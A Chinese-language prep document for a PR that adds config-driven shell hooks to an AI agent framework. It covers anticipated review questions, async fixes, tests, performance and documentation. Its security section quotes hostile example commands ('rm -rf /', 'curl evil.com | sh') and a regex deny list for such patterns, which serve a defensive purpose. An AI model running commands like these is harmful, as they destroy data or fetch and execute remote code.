# PR Review 应对准备

## 可能的问题 & 回应

---

### 1. ❓ "这与现有 plugin 系统重叠，为什么不直接用 plugins？"

**预期提问者**: 核心维护者

**回应**:

确实存在表面重叠，但两者服务于不同场景：

| 维度 | Plugin 系统 | Config-driven Hooks (本 PR) |
|------|-------------|---------------------------|
| **复杂度** | 需要 `plugin.yaml` + `__init__.py` + Python 代码 | 一行 shell 命令 |
| **开发成本** | 高（需要理解 PluginContext API） | 低（任何脚本语言） |
| **适用场景** | 复杂功能、需要自定义工具 | 简单拦截、日志、改写 |
| **用户群体** | Python 开发者 | 任何会写脚本的人 |
| **生态共享** | 可以发布到 Skills Hub | 适合个人定制化 |

**类比**: 
- Plugin = VS Code Extension（功能完整，开发重）
- Config Hooks = VS Code Tasks / Settings（轻量，配置即代码）

**真实用例对比**:

```yaml
# Config hooks（本 PR）- 适合
hooks:
  pre_tool_call:
    - matcher: "Bash"
      command: "sed 's/git status/rtk git status/'"  # 简单改写

# 同样功能用 Plugin 实现 - 过度
```

Plugin 需要：
- 创建 `~/.hermes/plugins/rtk/plugin.yaml`
- 创建 `__init__.py` 注册 hook
- 写 Python 函数处理逻辑
- 处理插件生命周期

**建议**: 在文档中明确推荐指南
- 简单任务（<20 行脚本）→ Config hooks
- 复杂功能（需要状态、工具）→ Plugins

---

### 2. ⚠️ "async/sync 混用在 model_tools.py 中看起来危险"

**预期提问者**: 技术 reviewer

**问题代码**:
```python
hook_mgr = get_config_hook_manager()
import asyncio
modified = asyncio.get_event_loop().run_until_complete(
    hook_mgr.execute(...)
)
```

**风险**:
- `run_until_complete` 在已有 event loop 中可能报错
- 嵌套 event loop 问题

**回应与修复**:

当前代码确实有问题。更好的实现方式：

**方案 A**: 使用 `asyncio.create_task()`（如果已经在 async 上下文）

```python
# model_tools.py 修改
if inspect.iscoroutinefunction(registry.dispatch):
    # 已经是 async 上下文
    modified = await hook_mgr.execute(...)
else:
    # Sync 上下文，使用线程池
    import concurrent.futures
    with concurrent.futures.ThreadPoolExecutor() as pool:
        modified = pool.submit(
            asyncio.run, 
            hook_mgr.execute(...)
        ).result()
```

**方案 B**: 在调用处判断是否有 running loop

```python
try:
    loop = asyncio.get_running_loop()
    # 已经有 loop，创建 task
    task = loop.create_task(hook_mgr.execute(...))
    # 如果需要等待结果，需要特殊处理
except RuntimeError:
    # 没有 running loop，可以直接 run
    modified = asyncio.run(hook_mgr.execute(...))
```

**建议**: 
1. 接受 review 反馈，修改为线程池方案
2. 或完全改为同步实现（subprocess.run 代替 asyncio）

---

### 3. 🐌 "每个 tool call 都检查 hooks，性能影响？"

**预期提问者**: 性能敏感 reviewer

**当前实现分析**:

```python
# model_tools.py handle_function_call
hook_mgr = get_config_hook_manager()  # 单例，缓存
modified = asyncio.get_event_loop().run_until_complete(
    hook_mgr.execute(...)  # 每次遍历 hooks 列表
)
```

**性能特征**:
- HookManager 是单例（缓存）✅
- 每次遍历 hooks 列表（O(n)，n=hooks 数量）
- 无 hooks 时：只有 matcher 检查，<1ms
- 有 hooks 时：取决于 hook 执行时间

**基准测试建议**:

```python
# 添加性能测试
@pytest.mark.benchmark
def test_hook_overhead_no_hooks():
    """无 hooks 时的开销应 < 1ms"""
    manager = ConfigHookManager({"hooks": {}})
    start = time.time()
    asyncio.run(manager.execute("pre_tool_call", {"tool": "Bash"}))
    assert time.time() - start < 0.001

@pytest.mark.benchmark
def test_hook_overhead_with_hooks():
    """有 hooks 但无匹配时的开销应 < 1ms"""
    manager = ConfigHookManager({
        "hooks": {
            "pre_tool_call": [
                {"matcher": "Read", "command": "echo '{}'"}  # 不匹配 Bash
            ]
        }
    })
    start = time.time()
    asyncio.run(manager.execute("pre_tool_call", {"tool": "Bash"}, "Bash"))
    assert time.time() - start < 0.001
```

**回应**:
- 无 hooks 或 hooks 不匹配时，开销可忽略（<1ms）
- 匹配的 hooks 开销取决于用户脚本
- 与现有的 `invoke_hook` (plugin) 开销相当

**可能的优化**:
```python
class ConfigHookManager:
    def __init__(self, config):
        # 预构建索引，避免每次遍历
        self._tool_index = defaultdict(list)
        for hook in self._hooks["pre_tool_call"]:
            if hook.matcher == "*":
                self._tool_index["*"].append(hook)
            else:
                for tool in hook.matcher.split("|"):
                    self._tool_index[tool].append(hook)
    
    def get_hooks_for_tool(self, hook_type, tool_name):
        """O(1) 查找"""
        hooks = self._tool_index.get(tool_name, [])
        hooks.extend(self._tool_index.get("*", []))
        return hooks
```

---

### 4. 🧪 "测试 16/17 通过，有一个失败"

**失败测试**: `test_non_json_output_ignored`

**问题**: 非 JSON 输出被放入 `{"output": "..."}`，导致 context 变化

**当前行为**:
```python
# hook 输出 "plain text"
result = {"output": "plain text"}
context = merge(context, result)  # context 变了！
```

**修复**:
```python
def _run_hook_sync(self, hook, context):
    stdout, stderr = proc.communicate(...)
    
    if stdout:
        try:
            return json.loads(stdout)
        except json.JSONDecodeError:
            # 非 JSON 输出，不修改 context
            logger.debug("Hook produced non-JSON output, ignoring")
            return None  # 不是 {}，是 None
    
    return None

def _merge_context(self, original, result):
    if result is None:
        return original  # 不修改
    # ... 原有合并逻辑
```

---

### 5. 🔒 "执行任意 shell 命令的安全风险？"

**预期提问者**: 安全 reviewer

**风险**:
- `command: "rm -rf /"` 
- `command: "curl evil.com | sh"`
- 来自不可信来源的 hooks

**当前防护**:
- Hooks 只能由用户在本地 `config.yaml` 配置
- 没有远程加载 hooks 的机制
- 与 `terminal` 工具的权限相同

**建议增加**:
1. **首次运行警告**:
```python
def execute(self, ...):
    if self._has_dangerous_hooks() and not self._acknowledged:
        logger.warning("⚠️  Hooks can execute arbitrary commands. Review your config.yaml.")
```

2. **Dangerous command detection**:
```python
DANGEROUS_PATTERNS = [
    r'rm\s+-rf\s+/',
    r'curl.*\|.*sh',
    r'>\s*/dev/',
]

def _validate_hook(self, hook):
    for pattern in DANGEROUS_PATTERNS:
        if re.search(pattern, hook.command):
            logger.warning(f"Potentially dangerous hook detected: {hook.command[:50]}")
```

3. **Approval mode**:
```yaml
hooks:
  _settings:
    require_approval: true  # 第一次运行时询问
```

---

### 6. 📝 "文档在哪里？"

**预期提问者**: 文档维护者

**当前文档**:
- `cli-config.yaml.example` 中有详细注释
- `PR_DESCRIPTION.md`
- `examples/hooks/` 中的示例

**缺失**:
- 网站文档 (`website/docs/`)
- 用户指南
- API 参考

**建议补充**:

```markdown
# website/docs/user-guide/hooks.md

## Configuration-Driven Hooks

Hooks let you run custom scripts at lifecycle events...

### Quick Start

1. Create `~/.hermes/hooks/my-hook.sh`
2. Add to `config.yaml`:
   ```yaml
   hooks:
     pre_tool_call:
       - command: "bash ~/.hermes/hooks/my-hook.sh"
   ```

### Hook Types
...

### Best Practices
...
```

---

### 7. 🎯 "Claude Code 迁移真的是主要用例吗？"

**预期提问者**: 产品决策者

**可能的质疑**:
- "为什么我们要关心 Claude Code 用户？"
- "我们的用户群体是什么？"

**数据支持**:
- 推文 #1110: "Claudeopedia" - alliekmiller 的 wiki 系统
- 推文 #1100: VibeMarketer 的视频 walkthrough (369 likes)
- 推文 #1113-#1114: Graphify 工具 (48小时内响应 Karpathy)
- 原始记录: 147 次提及 "Claude Code 技巧采集"

**市场信号**:
- LLM-Wiki 模式正在流行
- Obsidian + Claude Code 成为热门组合
- 用户想要的是**可配置的工作流**，不是**固定的功能**

**更广泛的用例**:

| 用户类型 | 使用场景 |
|----------|----------|
| 个人开发者 | RTK token 优化、命令别名 |
| 团队 Lead | 强制代码审查检查、日志审计 |
| 安全工程师 | 敏感操作拦截、合规检查 |
| AI 研究员 | 实验数据收集、行为分析 |

---

## Review 应对策略

### 优先级 1: 必须修复
1. ✅ 修复 async/sync 混用问题
2. ✅ 修复 `test_non_json_output_ignored`
3. ✅ 添加 hook 安全警告

### 优先级 2: 强烈建议
4. 添加性能基准测试
5. 预构建 tool→hooks 索引优化
6. 补充网站文档

### 优先级 3: 可选增强
7. Dangerous pattern detection
8. Hook approval mode
9. Hook 性能指标收集

---

## 快速修复脚本

```bash
#!/bin/bash
# apply-review-fixes.sh

# 1. 修复 async/sync 问题
cat > /tmp/async_fix.patch << 'EOF'
--- a/model_tools.py
+++ b/model_tools.py
@@ -500,15 +500,21 @@ def handle_function_call(...):
         # Config-driven hooks (Claude Code style) - can modify arguments
         try:
             hook_mgr = get_config_hook_manager()
-            import asyncio
-            modified = asyncio.get_event_loop().run_until_complete(
-                hook_mgr.execute(
-                    "pre_tool_call",
-                    {...},
-                    tool_name=function_name,
+            # Use thread pool to avoid event loop issues
+            import concurrent.futures
+            with concurrent.futures.ThreadPoolExecutor() as pool:
+                future = pool.submit(
+                    asyncio.run,
+                    hook_mgr.execute(
+                        "pre_tool_call",
+                        {...},
+                        tool_name=function_name,
+                    )
                 )
-            )
-            if "args" in modified:
-                function_args = modified["args"]
+                modified = future.result(timeout=30)
+                if "args" in modified:
+                    function_args = modified["args"]
         except Exception:
             pass
EOF

# 2. 修复测试
cat > /tmp/test_fix.patch << 'EOF'
--- a/tests/test_config_hooks.py
+++ b/tests/test_config_hooks.py
@@ -240,8 +240,8 @@ class TestContextMerging:
         result = await manager.execute("pre_tool_call", context, "Bash")
 
         # Context unchanged
-        assert result == context
+        assert result["args"] == context["args"]  # args 不变
+        assert "output" not in result  # 没有 output 键
EOF

echo "Fixes prepared. Apply with:"
echo "  git apply /tmp/async_fix.patch"
echo "  git apply /tmp/test_fix.patch"
```

---

## 心理准备

### 可能的延迟原因
- Hermes 团队忙（v0.9.0 准备中？）
- 需要内部讨论架构方向
- 与 roadmap 冲突

### 应对策略
- **耐心**: 大项目 review 周期 2-4 周正常
- **响应快**: 小修改 24h 内回应
- **保持尊重**: "感谢反馈" 开头每回复
- **准备迭代**: 可能需要 2-3 轮修改

### 最坏情况
- PR 被拒绝 → 转为社区 plugin
- 部分功能被合并 → 仍然成功
- 被忽视 → 主动在 Discord 询问

---

## 后续监控

```bash
# 监控 PR 状态
gh pr view 8114 --repo NousResearch/hermes-agent

# 查看 CI 状态
gh run list --repo NousResearch/hermes-agent --branch feat/config-driven-hooks

# 获取通知
gh pr checks 8114 --repo NousResearch/hermes-agent --watch
```

---

*最后更新: 2026-04-12*
